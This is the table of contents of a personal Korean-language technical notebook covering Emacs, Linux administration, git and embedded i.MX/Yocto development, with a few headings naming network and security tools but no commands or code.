+++
title = "My Notes"
author = ["Yong-Beom Gwon"]
date = 2014-12-28T00:00:00+09:00
draft = false
+++

<style>
  .ox-hugo-toc ul {
    list-style: none;
  }
</style>
<div class="ox-hugo-toc toc">
<div></div>

<div class="heading">Table of Contents</div>

- <span class="section-num">1</span> [Tasks](#tasks)
    - <span class="section-num">1.1</span> [<span class="org-todo todo TODO">TODO</span> 구글 repo 사용법 정리](#구글-repo-사용법-정리)
    - <span class="section-num">1.2</span> [<span class="org-todo todo TODO">TODO</span> QT 프로그래밍 정리](#qt-프로그래밍-정리)
    - <span class="section-num">1.3</span> [<span class="org-todo done DONE">DONE</span> mu4e 설정 정리](#mu4e-설정-정리)
    - <span class="section-num">1.4</span> [<span class="org-todo todo TODO">TODO</span> shell programming background proccess 제어 정리](#shell-programming-background-proccess-제어-정리)
    - <span class="section-num">1.5</span> [<span class="org-todo done DONE">DONE</span> imx6 reboot 명령이 안먹는 문제](#imx6-reboot-명령이-안먹는-문제)
    - <span class="section-num">1.6</span> [<span class="org-todo done DONE">DONE</span> I.MX6 안드로이드 Nougat 포팅 이슈 <code>[2/2]</code>](#i-dot-mx6-안드로이드-nougat-포팅-이슈)
    - <span class="section-num">1.7</span> [<span class="org-todo todo TODO">TODO</span> imx7D 관련 문서 정리. cortexM4 개발 관련 설정등](#imx7d-관련-문서-정리-dot-cortexm4-개발-관련-설정등)
    - <span class="section-num">1.8</span> [<span class="org-todo done DONE">DONE</span> drv console rootfs 정리 <code>[3/3]</code>](#drv-console-rootfs-정리)
    - <span class="section-num">1.9</span> [<span class="org-todo done DONE">DONE</span> drv\_console 메뉴얼 만들기](#drv-console-메뉴얼-만들기)
    - <span class="section-num">1.10</span> [<span class="org-todo done DONE">DONE</span> drv\_console 보드 업데이트 구성 <code>[6/6]</code>](#drv-console-보드-업데이트-구성)
    - <span class="section-num">1.11</span> [<span class="org-todo done DONE">DONE</span> imx new bsp 빌드및 테스트](#imx-new-bsp-빌드및-테스트)
    - <span class="section-num">1.12</span> [<span class="org-todo done DONE">DONE</span> UUU(Universal Update Utility) 정리](#uuu--universal-update-utility--정리)
    - <span class="section-num">1.13</span> [<span class="org-todo done DONE">DONE</span> OPTEE 관련 정리하기](#optee-관련-정리하기)
    - <span class="section-num">1.14</span> [<span class="org-todo todo TODO">TODO</span> amazon aws 파악하기 <code>[0/1]</code>](#amazon-aws-파악하기)
    - <span class="section-num">1.15</span> [<span class="org-todo done DONE">DONE</span> 노트북 구입](#노트북-구입)
    - <span class="section-num">1.16</span> [<span class="org-todo done DONE">DONE</span> conky 설정](#conky-설정)
    - <span class="section-num">1.17</span> [<span class="org-todo todo TODO">TODO</span> stressapptest 오류 해결하기](#stressapptest-오류-해결하기)
    - <span class="section-num">1.18</span> [<span class="org-todo done DONE">DONE</span> mu4e 메일 send smtp daum으로 변경하기](#mu4e-메일-send-smtp-daum으로-변경하기)
    - <span class="section-num">1.19</span> [<span class="org-todo todo TODO">TODO</span> AWS 관련 서적 정리하고 반납하기](#aws-관련-서적-정리하고-반납하기)
    - <span class="section-num">1.20</span> [<span class="org-todo todo TODO">TODO</span> ssh host key check 관련 정리하기](#ssh-host-key-check-관련-정리하기)
    - <span class="section-num">1.21</span> [<span class="org-todo done DONE">DONE</span> 회사 사직 <code>[5/5]</code>](#회사-사직)
    - <span class="section-num">1.22</span> [<span class="org-todo todo TODO">TODO</span> github page](#github-page)
- <span class="section-num">2</span> [Emacs](#emacs)
    - <span class="section-num">2.1</span> [<span class="org-todo done CANCELED">CANCELED</span> apt 모드 프래그램 만들기](#apt-모드-프래그램-만들기)
    - <span class="section-num">2.2</span> [<span class="org-todo done DEFERRED">DEFERRED</span> org-mode에서 매일 변경된 부분만 따로 보는 방법 찾기](#org-mode에서-매일-변경된-부분만-따로-보는-방법-찾기)
    - <span class="section-num">2.3</span> [<span class="org-todo done DONE">DONE</span> web bookmark 관리 패키지 찾아보기](#web-bookmark-관리-패키지-찾아보기)
    - <span class="section-num">2.4</span> [<span class="org-todo done DONE">DONE</span> dot emacs에 있는 package 관련 주석 따로 정리하기](#dot-emacs에-있는-package-관련-주석-따로-정리하기)
    - <span class="section-num">2.5</span> [<span class="org-todo done DONE">DONE</span> emacs 사용법 프로그램 방법론 정리](#emacs-사용법-프로그램-방법론-정리)
        - <span class="section-num">2.5.1</span> [C C++ 프로그래밍](#c-c-plus-plus-프로그래밍)
        - <span class="section-num">2.5.2</span> [java, python &#x2026; 다른 랭귀지는 차후 업그레이드 예정](#java-python-and-x2026-다른-랭귀지는-차후-업그레이드-예정)
    - <span class="section-num">2.6</span> [org-mode 설정 변경](#org-mode-설정-변경)
    - <span class="section-num">2.7</span> [<span class="org-todo done DEFERRED">DEFERRED</span> 원격 접속해제후 /dev/null 파일이 일반 파일로 바뀌는 문제](#원격-접속해제후-dev-null-파일이-일반-파일로-바뀌는-문제)
        - <span class="section-num">2.7.1</span> [tramp 가 HISTFILE=/dev/null로 셋팅해서라는 글](#tramp-가-histfile-dev-null로-셋팅해서라는-글)
    - <span class="section-num">2.8</span> [<span class="org-todo done DEFERRED">DEFERRED</span> 원격 접속시 emacsclient가 display를 다른 화면으로 보냄](#원격-접속시-emacsclient가-display를-다른-화면으로-보냄)
    - <span class="section-num">2.9</span> [remove hook](#remove-hook)
    - <span class="section-num">2.10</span> [unicode 문자 찾기](#unicode-문자-찾기)
    - <span class="section-num">2.11</span> [emacs shell 에서 ps 명령어 주의사항](#emacs-shell-에서-ps-명령어-주의사항)
    - <span class="section-num">2.12</span> [shell command 현재 버퍼에 삽입하기](#shell-command-현재-버퍼에-삽입하기)
    - <span class="section-num">2.13</span> [현재 파일의 변경사항 보기](#현재-파일의-변경사항-보기)
    - <span class="section-num">2.14</span> [query-replace-regexp](#query-replace-regexp)
        - <span class="section-num">2.14.1</span> [capture 그룹 사용하기](#capture-그룹-사용하기)
        - <span class="section-num">2.14.2</span> [산술연산 사용하기](#산술연산-사용하기)
    - <span class="section-num">2.15</span> [find-grep](#find-grep)
    - <span class="section-num">2.16</span> [Emacs shell ioctl error](#emacs-shell-ioctl-error)
    - <span class="section-num">2.17</span> [nonascii char 찾기](#nonascii-char-찾기)
    - <span class="section-num">2.18</span> [delete blank line](#delete-blank-line)
    - <span class="section-num">2.19</span> [bbdb mu4e](#bbdb-mu4e)
    - <span class="section-num">2.20</span> [org mode attach](#org-mode-attach)
    - <span class="section-num">2.21</span> [hard link](#hard-link)
        - <span class="section-num">2.21.1</span> [링크](#링크)
    - <span class="section-num">2.22</span> [Org html export theme 사용하기](#org-html-export-theme-사용하기)
        - <span class="section-num">2.22.1</span> [사용법](#사용법)
        - <span class="section-num">2.22.2</span> [링크](#링크)
    - <span class="section-num">2.23</span> [emacs is evil](#emacs-is-evil)
    - <span class="section-num">2.24</span> [check current encoding system](#check-current-encoding-system)
    - <span class="section-num">2.25</span> [easypg no secret key error](#easypg-no-secret-key-error)
    - <span class="section-num">2.26</span> [Elpy python 버전 변경하기](#elpy-python-버전-변경하기)
        - <span class="section-num">2.26.1</span> [참조](#참조)
    - <span class="section-num">2.27</span> [calc mode](#calc-mode)
    - <span class="section-num">2.28</span> [org mode 에서 강제 newline 삽입하기](#org-mode-에서-강제-newline-삽입하기)
    - <span class="section-num">2.29</span> [org mode 에서 inline image 사용하기](#org-mode-에서-inline-image-사용하기)
        - <span class="section-num">2.29.1</span> [모든 파일에 적용하기](#모든-파일에-적용하기)
        - <span class="section-num">2.29.2</span> [특정 파일에 적용하기](#특정-파일에-적용하기)
        - <span class="section-num">2.29.3</span> [실시간으로 on off](#실시간으로-on-off)
    - <span class="section-num">2.30</span> [mu4e](#mu4e)
        - <span class="section-num">2.30.1</span> [가져오기](#가져오기)
        - <span class="section-num">2.30.2</span> [보내기](#보내기)
        - <span class="section-num">2.30.3</span> [관련 패키지](#관련-패키지)
- <span class="section-num">3</span> [Linux](#linux)
    - <span class="section-num">3.1</span> [<span class="org-todo done DEFERRED">DEFERRED</span> gitlab timeout 발생하고 느려지는 문제 해결하기](#gitlab-timeout-발생하고-느려지는-문제-해결하기)
    - <span class="section-num">3.2</span> [<span class="org-todo done DONE">DONE</span> GitLab 설치하기](#gitlab-설치하기)
        - <span class="section-num">3.2.1</span> [OMNIBUS PACKAGE 설치](#omnibus-package-설치)
        - <span class="section-num">3.2.2</span> [CUSTOM 설치](#custom-설치)
    - <span class="section-num">3.3</span> [<span class="org-todo done DONE">DONE</span> systemd jounalctl 관련 정리하기](#systemd-jounalctl-관련-정리하기)
        - <span class="section-num">3.3.1</span> [EXAM](#exam)
        - <span class="section-num">3.3.2</span> [출력](#출력)
        - <span class="section-num">3.3.3</span> [링크](#링크)
    - <span class="section-num">3.4</span> [<span class="org-todo done DEFERRED">DEFERRED</span> 리눅스 디바이스 드라이버 책 다시보기](#리눅스-디바이스-드라이버-책-다시보기)
    - <span class="section-num">3.5</span> [user management in archlinux](#user-management-in-archlinux)
    - <span class="section-num">3.6</span> [GitLab project setup](#gitlab-project-setup)
    - <span class="section-num">3.7</span> [GitLab import existing Git repository](#gitlab-import-existing-git-repository)
    - <span class="section-num">3.8</span> [Merge two Git repositories without breaking file history](#merge-two-git-repositories-without-breaking-file-history)
    - <span class="section-num">3.9</span> [Desktop notifications](#desktop-notifications)
    - <span class="section-num">3.10</span> [openssl 을 이용한 암호화및 복호화](#openssl-을-이용한-암호화및-복호화)
    - <span class="section-num">3.11</span> [<span class="org-todo done DONE">DONE</span> 메일 관련 재정리](#메일-관련-재정리)
        - <span class="section-num">3.11.1</span> [Local Mail](#local-mail)
        - <span class="section-num">3.11.2</span> [MTA](#mta)
        - <span class="section-num">3.11.3</span> [MDA](#mda)
        - <span class="section-num">3.11.4</span> [MUA](#mua)
        - <span class="section-num">3.11.5</span> [나의 설정](#나의-설정)
    - <span class="section-num">3.12</span> [<span class="org-todo done DONE">DONE</span> GitHub 메뉴얼 정리](#github-메뉴얼-정리)
        - <span class="section-num">3.12.1</span> [fork 사용법](#fork-사용법)
    - <span class="section-num">3.13</span> [lsof 사용시 주의사항](#lsof-사용시-주의사항)
    - <span class="section-num">3.14</span> [lsof command](#lsof-command)
        - <span class="section-num">3.14.1</span> [특정 포트 사용하는 프로세스 정보 보기](#특정-포트-사용하는-프로세스-정보-보기)
        - <span class="section-num">3.14.2</span> [특정 사용자가 사용하는 프로세스 정보](#특정-사용자가-사용하는-프로세스-정보)
        - <span class="section-num">3.14.3</span> [특정 파일을 사용하는 프로세스 정보](#특정-파일을-사용하는-프로세스-정보)
        - <span class="section-num">3.14.4</span> [특정 command 가 사용하는 프로세스 정보](#특정-command-가-사용하는-프로세스-정보)
        - <span class="section-num">3.14.5</span> [특정 파일 사용하는 프로세스 kill](#특정-파일-사용하는-프로세스-kill)
        - <span class="section-num">3.14.6</span> [링크](#링크)
    - <span class="section-num">3.15</span> [iptables command](#iptables-command)
        - <span class="section-num">3.15.1</span> [기본 출력](#기본-출력)
        - <span class="section-num">3.15.2</span> [불러오기](#불러오기)
        - <span class="section-num">3.15.3</span> [초기화](#초기화)
        - <span class="section-num">3.15.4</span> [저장하기](#저장하기)
        - <span class="section-num">3.15.5</span> [삭제하기](#삭제하기)
        - <span class="section-num">3.15.6</span> [LOG](#log)
        - <span class="section-num">3.15.7</span> [Exam](#exam)
    - <span class="section-num">3.16</span> [xtable](#xtable)
        - <span class="section-num">3.16.1</span> [설치](#설치)
        - <span class="section-num">3.16.2</span> [geoip 데이타 업데이트 스크립트](#geoip-데이타-업데이트-스크립트)
        - <span class="section-num">3.16.3</span> [add-on](#add-on)
    - <span class="section-num">3.17</span> [proxychains](#proxychains)
        - <span class="section-num">3.17.1</span> [<span class="org-todo done DEFERRED">DEFERRED</span> tor 알아보기](#tor-알아보기)
        - <span class="section-num">3.17.2</span> [사용법](#사용법)
        - <span class="section-num">3.17.3</span> [링크](#링크)
    - <span class="section-num">3.18</span> [netcat으로 proxy 서버를 경유하여 ssh 연결하기](#netcat으로-proxy-서버를-경유하여-ssh-연결하기)
        - <span class="section-num">3.18.1</span> [링크](#링크)
    - <span class="section-num">3.19</span> [logwatch](#logwatch)
        - <span class="section-num">3.19.1</span> [주의](#주의)
        - <span class="section-num">3.19.2</span> [설정](#설정)
        - <span class="section-num">3.19.3</span> [명령어](#명령어)
        - <span class="section-num">3.19.4</span> [링크](#링크)
    - <span class="section-num">3.20</span> [mpv 에서 자막 한글이 표시 안될 때](#mpv-에서-자막-한글이-표시-안될-때)
    - <span class="section-num">3.21</span> [compiz alt tab 문제](#compiz-alt-tab-문제)
    - <span class="section-num">3.22</span> [lsof 에서 gvfs 파일 시스템 경고](#lsof-에서-gvfs-파일-시스템-경고)
    - <span class="section-num">3.23</span> [gitlab update](#gitlab-update)
    - <span class="section-num">3.24</span> [virtualbox guest addition](#virtualbox-guest-addition)
    - <span class="section-num">3.25</span> [debian upgrade](#debian-upgrade)
    - <span class="section-num">3.26</span> [i8042: No controller found](#i8042-no-controller-found)
    - <span class="section-num">3.27</span> [live cd 활용하기](#live-cd-활용하기)
    - <span class="section-num">3.28</span> [nmap command](#nmap-command)
    - <span class="section-num">3.29</span> [netcat command                                     :netcat:reverse shell:](#netcat-command-netcat-reverse-shell)
    - <span class="section-num">3.30</span> [rkhunter](#rkhunter)
        - <span class="section-num">3.30.1</span> [설치](#설치)
        - <span class="section-num">3.30.2</span> [설정](#설정)
        - <span class="section-num">3.30.3</span> [수동 실행](#수동-실행)
    - <span class="section-num">3.31</span> [aide](#aide)
        - <span class="section-num">3.31.1</span> [설치](#설치)
        - <span class="section-num">3.31.2</span> [설정](#설정)
        - <span class="section-num">3.31.3</span> [에러](#에러)
        - <span class="section-num">3.31.4</span> [실행](#실행)
        - <span class="section-num">3.31.5</span> [참조](#참조)
    - <span class="section-num">3.32</span> [오른쪽 한글 키보드 매핑](#오른쪽-한글-키보드-매핑)
    - <span class="section-num">3.33</span> [드라이브가 마운트 되고 파일 매니저가 자동 열리지 않게 하기](#드라이브가-마운트-되고-파일-매니저가-자동-열리지-않게-하기)
    - <span class="section-num">3.34</span> [UBIFS](#ubifs)
        - <span class="section-num">3.34.1</span> [커널및 u-boot 설정](#커널및-u-boot-설정)
        - <span class="section-num">3.34.2</span> [UBI Image 이용하기](#ubi-image-이용하기)
        - <span class="section-num">3.34.3</span> [포멧하여 사용하기](#포멧하여-사용하기)
        - <span class="section-num">3.34.4</span> [IMX28](#imx28)
    - <span class="section-num">3.35</span> [FreeScale MX6 Android Build](#freescale-mx6-android-build)
        - <span class="section-num">3.35.1</span> [Build names](#build-names)
    - <span class="section-num">3.36</span> [FreeScale Yocto Project](#freescale-yocto-project)
    - <span class="section-num">3.37</span> [auto login script](#auto-login-script)
        - <span class="section-num">3.37.1</span> [출처](#출처)
    - <span class="section-num">3.38</span> [shell no operation command](#shell-no-operation-command)
    - <span class="section-num">3.39</span> [apt key add](#apt-key-add)
    - <span class="section-num">3.40</span> [projectile 사용법](#projectile-사용법)
        - <span class="section-num">3.40.1</span> [설치](#설치)
        - <span class="section-num">3.40.2</span> [단축키](#단축키)
        - <span class="section-num">3.40.3</span> [참조](#참조)
    - <span class="section-num">3.41</span> [리눅스 커널 모듈](#리눅스-커널-모듈)
        - <span class="section-num">3.41.1</span> [정보](#정보)
        - <span class="section-num">3.41.2</span> [로딩](#로딩)
        - <span class="section-num">3.41.3</span> [옵션](#옵션)
        - <span class="section-num">3.41.4</span> [blacklist](#blacklist)
        - <span class="section-num">3.41.5</span> [출처](#출처)
    - <span class="section-num">3.42</span> [wireless](#wireless)
        - <span class="section-num">3.42.1</span> [Driver 상태 확인](#driver-상태-확인)
        - <span class="section-num">3.42.2</span> [tool 사용법](#tool-사용법)
        - <span class="section-num">3.42.3</span> [연결 예제](#연결-예제)
        - <span class="section-num">3.42.4</span> [rfkill](#rfkill)
        - <span class="section-num">3.42.5</span> [regdomain 설정](#regdomain-설정)
        - <span class="section-num">3.42.6</span> [절전](#절전)
        - <span class="section-num">3.42.7</span> [help](#help)
        - <span class="section-num">3.42.8</span> [참조](#참조)
    - <span class="section-num">3.43</span> [remount partition](#remount-partition)
    - <span class="section-num">3.44</span> [iperf 사용법](#iperf-사용법)
    - <span class="section-num">3.45</span> [ip route change default gw dev](#ip-route-change-default-gw-dev)
    - <span class="section-num">3.46</span> [dirty kernel release](#dirty-kernel-release)
    - <span class="section-num">3.47</span> [기존 디렉토리 git 저장소 초기화](#기존-디렉토리-git-저장소-초기화)
    - <span class="section-num">3.48</span> [shell script 에서 디렉토리 파일 읽어오기](#shell-script-에서-디렉토리-파일-읽어오기)
    - <span class="section-num">3.49</span> [Bluetooth](#bluetooth)
        - <span class="section-num">3.49.1</span> [cli로 간단히 연결하기](#cli로-간단히-연결하기)
        - <span class="section-num">3.49.2</span> [bluez test tool](#bluez-test-tool)
        - <span class="section-num">3.49.3</span> [A2DP 설정](#a2dp-설정)
    - <span class="section-num">3.50</span> [Cortex-A9 컴파일러 옵션](#cortex-a9-컴파일러-옵션)
        - <span class="section-num">3.50.1</span> [-mcpu = cortex-a9](#mcpu-cortex-a9)
        - <span class="section-num">3.50.2</span> [-march = armv7-a](#march-armv7-a)
        - <span class="section-num">3.50.3</span> [디버깅](#디버깅)
        - <span class="section-num">3.50.4</span> [최적화](#최적화)
    - <span class="section-num">3.51</span> [tar 유틸 사용시 버전 관련 파일 제외하고 묶을때](#tar-유틸-사용시-버전-관련-파일-제외하고-묶을때)
    - <span class="section-num">3.52</span> [shell serial programming](#shell-serial-programming)
        - <span class="section-num">3.52.1</span> [설정](#설정)
        - <span class="section-num">3.52.2</span> [READ](#read)
        - <span class="section-num">3.52.3</span> [WRITE](#write)
    - <span class="section-num">3.53</span> [Serial C Programming Exam](#serial-c-programming-exam)
    - <span class="section-num">3.54</span> [GPS data parse shell script](#gps-data-parse-shell-script)
    - <span class="section-num">3.55</span> [serial port reset](#serial-port-reset)
    - <span class="section-num">3.56</span> [ltib 패키지 단위로 작업하기](#ltib-패키지-단위로-작업하기)
    - <span class="section-num">3.57</span> [udev 간단 예제](#udev-간단-예제)
    - <span class="section-num">3.58</span> [ramdisk 사용법](#ramdisk-사용법)
    - <span class="section-num">3.59</span> [부트스트랩 코드에서 사용하는 로우레벨 UART 포트 설정](#부트스트랩-코드에서-사용하는-로우레벨-uart-포트-설정)
    - <span class="section-num">3.60</span> [Kernel parameter](#kernel-parameter)
    - <span class="section-num">3.61</span> [endian 알아내기](#endian-알아내기)
    - <span class="section-num">3.62</span> [git detached](#git-detached)
    - <span class="section-num">3.63</span> [git log message 수정](#git-log-message-수정)
    - <span class="section-num">3.64</span> [PYTHON virtualenv](#python-virtualenv)
    - <span class="section-num">3.65</span> [VIRTUALENV WRAPPER](#virtualenv-wrapper)
    - <span class="section-num">3.66</span> [CCACHE](#ccache)
    - <span class="section-num">3.67</span> [Kernel Build 시 defined(@array) Error](#kernel-build-시-defined--array--error)
    - <span class="section-num">3.68</span> [Macosx pkg 파일 풀기](#macosx-pkg-파일-풀기)
    - <span class="section-num">3.69</span> [파일 Encoding 변환](#파일-encoding-변환)
    - <span class="section-num">3.70</span> [gitignore 파일을 이미 커밋한 저장소에 적용하기](#gitignore-파일을-이미-커밋한-저장소에-적용하기)
    - <span class="section-num">3.71</span> [git archive](#git-archive)
    - <span class="section-num">3.72</span> [group mail 보내기](#group-mail-보내기)
    - <span class="section-num">3.73</span> [Pacman Error](#pacman-error)
    - <span class="section-num">3.74</span> [grep 이 파일 타입을 잘못 감지할 때](#grep-이-파일-타입을-잘못-감지할-때)
    - <span class="section-num">3.75</span> [debian java 6 설정](#debian-java-6-설정)
    - <span class="section-num">3.76</span> [라이브러리 만들기](#라이브러리-만들기)
        - <span class="section-num">3.76.1</span> [Static Libraries](#static-libraries)
        - <span class="section-num">3.76.2</span> [Shared(Dynamic) Libraries](#shared--dynamic--libraries)
    - <span class="section-num">3.77</span> [NFS on archlinux](#nfs-on-archlinux)
    - <span class="section-num">3.78</span> [image 형식 변환](#image-형식-변환)
        - <span class="section-num">3.78.1</span> [이미지 하나만 변환하기](#이미지-하나만-변환하기)
        - <span class="section-num">3.78.2</span> [여러개 동시에 변환하기](#여러개-동시에-변환하기)
        - <span class="section-num">3.78.3</span> [image size 변환](#image-size-변환)
    - <span class="section-num">3.79</span> [build dependency 설치](#build-dependency-설치)
    - <span class="section-num">3.80</span> [git stash](#git-stash)
    - <span class="section-num">3.81</span> [Debian Cross Compile 2](#debian-cross-compile-2)
        - <span class="section-num">3.81.1</span> [이전방식](#이전방식)
        - <span class="section-num">3.81.2</span> [현재 cross compile 방법](#현재-cross-compile-방법)
    - <span class="section-num">3.82</span> [sbuild](#sbuild)
        - <span class="section-num">3.82.1</span> [Cross Building](#cross-building)
    - <span class="section-num">3.83</span> [Multiarch CrossDependencies](#multiarch-crossdependencies)
        - <span class="section-num">3.83.1</span> [링크](#링크)
    - <span class="section-num">3.84</span> [mk-sbuild](#mk-sbuild)
        - <span class="section-num">3.84.1</span> [링크](#링크)
    - <span class="section-num">3.85</span> [sbuild-createchroot](#sbuild-createchroot)
    - <span class="section-num">3.86</span> [schroot 사용하기](#schroot-사용하기)
        - <span class="section-num">3.86.1</span> [Using](#using)
        - <span class="section-num">3.86.2</span> [삭제](#삭제)
    - <span class="section-num">3.87</span> [schroot 사용 (데비안)](#schroot-사용--데비안)
        - <span class="section-num">3.87.1</span> [설치](#설치)
        - <span class="section-num">3.87.2</span> [/etc/schroot/schroot.conf 편집](#etc-schroot-schroot-dot-conf-편집)
        - <span class="section-num">3.87.3</span> [사용](#사용)
    - <span class="section-num">3.88</span> [multiarch](#multiarch)
    - <span class="section-num">3.89</span> [24cxx eeprom driver porting](#24cxx-eeprom-driver-porting)
        - <span class="section-num">3.89.1</span> [사용법](#사용법)
    - <span class="section-num">3.90</span> [git clone all branches](#git-clone-all-branches)
    - <span class="section-num">3.91</span> [특정 사용자의 commit diff 만들기](#특정-사용자의-commit-diff-만들기)
    - <span class="section-num">3.92</span> [날짜를 이용한 git diff 사용](#날짜를-이용한-git-diff-사용)
    - <span class="section-num">3.93</span> [git rebase 후 다시 원복 할 때](#git-rebase-후-다시-원복-할-때)
    - <span class="section-num">3.94</span> [checkout a single file from another commit or branch](#checkout-a-single-file-from-another-commit-or-branch)
    - <span class="section-num">3.95</span> [IMX28 MFGTools 용 이미지 빌드](#imx28-mfgtools-용-이미지-빌드)
    - <span class="section-num">3.96</span> [IMX28용 Qt Embedded with tslib 설치](#imx28용-qt-embedded-with-tslib-설치)
    - <span class="section-num">3.97</span> [Yocto Guide](#yocto-guide)
        - <span class="section-num">3.97.1</span> [List MACHINE](#list-machine)
        - <span class="section-num">3.97.2</span> [List DISTRO](#list-distro)
        - <span class="section-num">3.97.3</span> [List Image](#list-image)
    - <span class="section-num">3.98</span> [Yocto imx6](#yocto-imx6)
    - <span class="section-num">3.99</span> [하드디스크 복제](#하드디스크-복제)
    - <span class="section-num">3.100</span> [Mfgtools 용 커널및 부트로더 빌드](#mfgtools-용-커널및-부트로더-빌드)
        - <span class="section-num">3.100.1</span> [LTIB 버전](#ltib-버전)
        - <span class="section-num">3.100.2</span> [Yocto 버전](#yocto-버전)
    - <span class="section-num">3.101</span> [NXP U-BOOT Porting](#nxp-u-boot-porting)
    - <span class="section-num">3.102</span> [kermit 전송](#kermit-전송)
        - <span class="section-num">3.102.1</span> [링크](#링크)
    - <span class="section-num">3.103</span> [linux kernel config show hidden option](#linux-kernel-config-show-hidden-option)
    - <span class="section-num">3.104</span> [IMX6 Multimedia](#imx6-multimedia)
        - <span class="section-num">3.104.1</span> [set enviromment](#set-enviromment)
        - <span class="section-num">3.104.2</span> [Audio Only](#audio-only)
        - <span class="section-num">3.104.3</span> [Video Only](#video-only)
        - <span class="section-num">3.104.4</span> [Audio/Video](#audio-video)
        - <span class="section-num">3.104.5</span> [Video Recording](#video-recording)
        - <span class="section-num">3.104.6</span> [Camera Preview](#camera-preview)
        - <span class="section-num">3.104.7</span> [Camera Snapshot](#camera-snapshot)
    - <span class="section-num">3.105</span> [Gstreamer Video Streaming](#gstreamer-video-streaming)
        - <span class="section-num">3.105.1</span> [camera input -> x264 encoder -> network](#camera-input-x264-encoder-network)
        - <span class="section-num">3.105.2</span> [camera input -> jpec encoder -> local and network](#camera-input-jpec-encoder-local-and-network)
        - <span class="section-num">3.105.3</span> [링크](#링크)
    - <span class="section-num">3.106</span> [gstreamer rotate play](#gstreamer-rotate-play)
    - <span class="section-num">3.107</span> [gstreamer debug](#gstreamer-debug)
    - <span class="section-num">3.108</span> [imx6 hdmi boot](#imx6-hdmi-boot)
    - <span class="section-num">3.109</span> [Display mode 변경](#display-mode-변경)
    - <span class="section-num">3.110</span> [bitbake](#bitbake)
        - <span class="section-num">3.110.1</span> [Toolchain 빌드하기](#toolchain-빌드하기)
        - <span class="section-num">3.110.2</span> [Kernel 재빌드](#kernel-재빌드)
        - <span class="section-num">3.110.3</span> [배포용 이미지 빌드](#배포용-이미지-빌드)
    - <span class="section-num">3.111</span> [How to recompile just a single kernel module](#how-to-recompile-just-a-single-kernel-module)
    - <span class="section-num">3.112</span> [firefox,emacs cache 관련](#firefox-emacs-cache-관련)
    - <span class="section-num">3.113</span> [외부 모듈 빌드용 Makefile](#외부-모듈-빌드용-makefile)
    - <span class="section-num">3.114</span> [Performance Tunning](#performance-tunning)
    - <span class="section-num">3.115</span> [Device Tree](#device-tree)
        - <span class="section-num">3.115.1</span> [기본 형식](#기본-형식)
        - <span class="section-num">3.115.2</span> [디바이스 주소지정](#디바이스-주소지정)
        - <span class="section-num">3.115.3</span> [주소 번역(ranges 속성)](#주소-번역--ranges-속성)
        - <span class="section-num">3.115.4</span> [인터럽트 처리](#인터럽트-처리)
        - <span class="section-num">3.115.5</span> [특수 노드들](#특수-노드들)
        - <span class="section-num">3.115.6</span> [Compile](#compile)
        - <span class="section-num">3.115.7</span> [링크](#링크)
    - <span class="section-num">3.116</span> [GPIO and Device Tree](#gpio-and-device-tree)
        - <span class="section-num">3.116.1</span> [gpio 를 sysfs 에서 제어](#gpio-를-sysfs-에서-제어)
        - <span class="section-num">3.116.2</span> [디바이스 트리에서 초기값 지정하기](#디바이스-트리에서-초기값-지정하기)
        - <span class="section-num">3.116.3</span> [커널 패치 적용후 device tree 에서 export](#커널-패치-적용후-device-tree-에서-export)
        - <span class="section-num">3.116.4</span> [정리하면](#정리하면)
    - <span class="section-num">3.117</span> [Cross GDB](#cross-gdb)
        - <span class="section-num">3.117.1</span> [App Debug](#app-debug)
        - <span class="section-num">3.117.2</span> [Kernel Debug](#kernel-debug)
        - <span class="section-num">3.117.3</span> [Kernel Module Debug](#kernel-module-debug)
        - <span class="section-num">3.117.4</span> [Oops Message Line 찾기](#oops-message-line-찾기)
    - <span class="section-num">3.118</span> [lirc and GPIO IR Receiver](#lirc-and-gpio-ir-receiver)
        - <span class="section-num">3.118.1</span> [데비안 패키지 가져오기](#데비안-패키지-가져오기)
        - <span class="section-num">3.118.2</span> [key mapping](#key-mapping)
    - <span class="section-num">3.119</span> [AR5B22 mini pcie 설정](#ar5b22-mini-pcie-설정)
        - <span class="section-num">3.119.1</span> [커널 4.1.15](#커널-4-dot-1-dot-15)
    - <span class="section-num">3.120</span> [git 검색](#git-검색)
        - <span class="section-num">3.120.1</span> [파일내용 검색](#파일내용-검색)
        - <span class="section-num">3.120.2</span> [log 내용 검색](#log-내용-검색)
        - <span class="section-num">3.120.3</span> [참조](#참조)
    - <span class="section-num">3.121</span> [Yocto rootfs 변경](#yocto-rootfs-변경)
    - <span class="section-num">3.122</span> [bitbake 설정 변경](#bitbake-설정-변경)
        - <span class="section-num">3.122.1</span> [build image 타입 변경](#build-image-타입-변경)
        - <span class="section-num">3.122.2</span> [build package 추가](#build-package-추가)
        - <span class="section-num">3.122.3</span> [u-boot boot mode 설정](#u-boot-boot-mode-설정)
        - <span class="section-num">3.122.4</span> [ubifs build paramater 변경](#ubifs-build-paramater-변경)
    - <span class="section-num">3.123</span> [bitbake commands](#bitbake-commands)
    - <span class="section-num">3.124</span> [u-boot usb 사용](#u-boot-usb-사용)
        - <span class="section-num">3.124.1</span> [flash kernel](#flash-kernel)
        - <span class="section-num">3.124.2</span> [flash ubifs](#flash-ubifs)
        - <span class="section-num">3.124.3</span> [링크](#링크)
    - <span class="section-num">3.125</span> [IMX28 mfgtools 용 펌웨어 빌드](#imx28-mfgtools-용-펌웨어-빌드)
    - <span class="section-num">3.126</span> [IMX28 porting](#imx28-porting)
        - <span class="section-num">3.126.1</span> [Build Yocto](#build-yocto)
        - <span class="section-num">3.126.2</span> [clone kernel](#clone-kernel)
        - <span class="section-num">3.126.3</span> [clone u-boot](#clone-u-boot)
    - <span class="section-num">3.127</span> [multi partition image mount](#multi-partition-image-mount)
    - <span class="section-num">3.128</span> [gvfs mount](#gvfs-mount)
        - <span class="section-num">3.128.1</span> [링크](#링크)
    - <span class="section-num">3.129</span> [gitlab backup and restore](#gitlab-backup-and-restore)
        - <span class="section-num">3.129.1</span> [<span class="org-todo done DONE">DONE</span> gitlab backup process 정리하기](#gitlab-backup-process-정리하기)
    - <span class="section-num">3.130</span> [lvm 복구](#lvm-복구)
        - <span class="section-num">3.130.1</span> [문제 발생 과정](#문제-발생-과정)
        - <span class="section-num">3.130.2</span> [복구 과정](#복구-과정)
        - <span class="section-num">3.130.3</span> [링크](#링크)
    - <span class="section-num">3.131</span> [공인 아피 주소및 dns 찾기](#공인-아피-주소및-dns-찾기)
        - <span class="section-num">3.131.1</span> [공인 ip 찾기](#공인-ip-찾기)
        - <span class="section-num">3.131.2</span> [DNS](#dns)
    - <span class="section-num">3.132</span> [virtualbox cli 명령어](#virtualbox-cli-명령어)
